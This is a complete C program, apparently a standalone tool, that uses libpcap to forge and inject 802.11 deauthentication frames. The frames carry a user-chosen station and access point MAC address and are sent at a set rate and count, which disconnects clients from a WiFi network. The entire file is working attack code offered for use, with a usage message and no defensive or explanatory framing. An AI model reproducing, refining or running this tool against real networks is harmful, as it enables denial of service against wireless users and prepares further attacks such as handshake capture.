
#include <getopt.h>
#include <pcap.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define ETH_ALEN 6

static const uint8_t radiotap_hdr[] = {
  0x00,     /*version*/
  0x00,     /*padding,for byte align*/
  0x08,0x00,/*radiotap length,little endian*/
  0x00,0x00,0x00,0x00,
};

static const char wlan_hdr[] = {
  0xc0, /*frame control 1100 0000(subtype = 1100,type = 00,protocol version = 00)*/
  0x00,
  0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x07, 0x00
};

void
usage(void)
{
	printf(
		"Usage: ./deauth <interface> \n\n"
		"      -s/--station <Station> MAC address\n\n"
    "      -a/--ap <Access points> MAC address\n\n"
		"      -r/--rate   <rate> packets per second\n\n"
    "      -n/--number <number>  number of packets\n\n"
		"\n");
	exit(1);
}

int main(int argc,char* argv[]){

    int rate = 1;
    int delay = 0;
    int number = 10;
    int rst;
    pcap_t *pcap = NULL;
    uint8_t pkt[4092];
    char szErrbuf[PCAP_ERRBUF_SIZE];
    uint8_t sta_addr[ETH_ALEN];
    uint8_t ap_addr[ETH_ALEN];

    while (1) {
        int option_idx;
        struct option longopt[] = {
            {"station",required_argument,0,'s'},
            {"ap",required_argument,0,'a'},
            {"rate",required_argument,0,'r'},
            {"number",required_argument,0,'n'},
            {"help", no_argument, NULL, 1 },
            {0,0,0,0}
        };

        int c = getopt_long(argc, argv, "s:a:r:n:",
    			longopt, &option_idx);

        if(c == -1){
          break;
        }

        switch (c) {
          case 0:
          break;

          case 'h':
      			usage();
      		break;

          case 'n':
        			number = atoi(optarg);
        			break;

          case 'r':
            rate = atoi(optarg);
          break;

          case 's':
          {
              rst = sscanf(optarg,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&sta_addr[0],&sta_addr[1],&sta_addr[2],&sta_addr[3],&sta_addr[4],&sta_addr[5]);
              if(rst < 6)
              {
                  printf("Station mac MUST be in human readable form like 01:02:03:04:05:06\r\n");
                  return -1;
              }
          }
          break;

          case 'a':
          {
              rst = sscanf(optarg,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&ap_addr[0],&ap_addr[1],&ap_addr[2],&ap_addr[3],&ap_addr[4],&ap_addr[5]);
              if(rst < 6)
              {
                  printf("Access points mac MUST be in human readable form like 01:02:03:04:05:06\r\n");
                  return -1;
              }
          }
          break;

          default:
      			printf("unknown switch %c\n", c);
      			usage();
      			break;
        }
    }

    if (optind >= argc)
  		usage();

    pcap = pcap_open_live(argv[optind], 65536, 1, 1, szErrbuf);
  	if (pcap == NULL) {
  		printf("Unable to open interface %s in pcap: %s\n",argv[optind], szErrbuf);
  		return 1;
  	}

    pcap_set_datalink(pcap, DLT_IEEE802_11_RADIO);

    delay = 1000000 / rate;
    memset(pkt, 0, sizeof(pkt));



    while (number) {
    		uint8_t *tmp = pkt;

    		// radiotap header
    		memcpy(pkt,radiotap_hdr,sizeof(radiotap_hdr));
    		tmp += sizeof(radiotap_hdr);

    		// wifi header
    		memcpy(tmp, wlan_hdr, sizeof(wlan_hdr));
        memcpy(tmp+4, sta_addr, ETH_ALEN);
        memcpy(tmp+10, ap_addr, ETH_ALEN);
        memcpy(tmp+16, ap_addr, ETH_ALEN);
        tmp += sizeof(wlan_hdr);

    		int packet_size = sizeof(radiotap_hdr) + sizeof(wlan_hdr);
    		rst = pcap_inject(pcap, pkt, packet_size);
    		if(rst != packet_size) {
    			perror("Trouble injecting packet");
    			return 1;
    		}

    		if(delay) {
    			usleep(delay);
    		}
    		number--;
  	}
}
